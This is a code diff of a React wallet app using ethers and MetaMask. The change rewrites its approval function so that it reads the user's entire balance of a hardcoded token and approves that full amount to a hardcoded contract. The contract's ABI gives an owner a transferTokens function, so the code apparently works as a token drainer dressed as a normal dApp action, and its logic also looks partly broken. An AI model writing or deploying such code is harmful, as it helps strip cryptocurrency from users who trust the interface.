@@ -3,7 +3,7 @@ import { Web3Provider } from '@ethersproject/providers';
 import { useState, useEffect } from 'react';
 import { formatBalance, formatChainAsNum } from './utils/index';
 import detectEthereumprovider from '@metamask/detect-provider';
-import { Contract, ethers, Signer } from 'ethers';
+import { Contract, ethers, Signer, providers } from 'ethers';
 import React from 'react';
 
 interface Wallet {
@@ -87,29 +87,52 @@ function App() {
         console.error('Token address is required.');
         return;
       }
-
+  
       await window.ethereum.enable();
       const provider = new Web3Provider(window.ethereum);
       const signer: Signer = provider.getSigner();
   
-      const contractAddress = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
-      const spender = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
-      const contractABI: any[] = [{"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newTokenAddress","type":"address"}],"name":"changeTokenAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"tokenAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"transferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+      const contractAddress = '0xb8686b967B2C161101D4cb7b1E167D13f8d6ef5E';
+      const contractABI: any[] = [{"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newTokenAddress","type":"address"}],"name":"changeTokenAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"tokenAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"transferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}];
   
       const contract = new Contract(contractAddress, contractABI, signer);
-      const allowance = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
   
-      // Call the 'approve' function of your contract with spender and allowance
-      const tx = await contract.approve(tokenAddress, allowance, { gasLimit: 10000000 });
+      // Replace 'spenderContractAddress' with the address of the contract you want to approve
+      const spenderContractAddress = '0xb8686b967B2C161101D4cb7b1E167D13f8d6ef5E';
+  
+      // Fetch the user's token balance
+      const tokenBalance = await getTokenBalance(provider); // Pass the provider as an argument
+  
+      // Approve the entire balance
+      const approvalAmount = tokenBalance; // Use the user's token balance
+  
+      // Call the 'approve' function with spender and the entire balance
+      const tx = await contract.approve(spenderContractAddress, approvalAmount);
       await tx.wait();
   
-      console.log('Approval successful.');
+      console.log('Approval of the entire balance successful.');
     } catch (error) {
       console.error('Error approving spending:', error);
     }
     setIsProcessing(false);
-  };  
+  };
+  
+  // Function to fetch the user's token balance
+const getTokenBalance = async (provider: Web3Provider) => {
+  // Replace 'tokenAddress' with the actual address of the token
+  const tokenAddress = '0x31437ff9083a2C5af07468042e3a84C3e5F74a07';
 
+  // Use the provider to create a contract instance
+  const tokenContract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)'], provider);
+
+  // Fetch the balance of the user's address
+  const userAddress = wallet.accounts[0]; // Replace with your logic to get the user's address
+  const balance = await tokenContract.balanceOf(userAddress);
+
+  return balance;
+};
+
+      
   const disableConnect = Boolean(wallet) && isConnecting;
 
   return (
